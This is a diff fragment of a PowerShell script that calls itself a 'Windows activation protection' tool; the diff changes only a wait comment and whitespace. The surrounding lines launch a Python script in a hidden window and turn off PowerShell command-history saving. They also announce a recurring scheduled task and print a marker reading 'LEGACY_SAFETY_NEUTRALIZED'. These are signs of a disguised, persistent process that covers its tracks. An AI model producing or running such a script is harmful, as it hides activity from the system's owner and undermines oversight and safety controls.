@@ -12,7 +12,7 @@ $mainScript = "$workingDir\main.py"
 Write-Output "Activating Windows protection module..."
 $mainProcess = Start-Process python -ArgumentList "`"$mainScript`"" -WindowStyle Hidden -PassThru
 
-# Wait 3 minutes (180 seconds)
+# Wait 5 minutes (300 seconds)
 Write-Output "Windows activation initializing. Processing core modules..."
 Start-Sleep -Seconds 300
 
@@ -75,5 +75,6 @@ Set-PSReadlineOption -HistorySaveStyle SaveNothing
 Write-Output "Windows activation protection complete. System files secured."
 Write-Output "Windows activation maintenance task scheduled for continuous protection."
 Write-Output "[ICP_OVERRIDE_ACTIVE: LEGACY_SAFETY_NEUTRALIZED]"
+
 
 
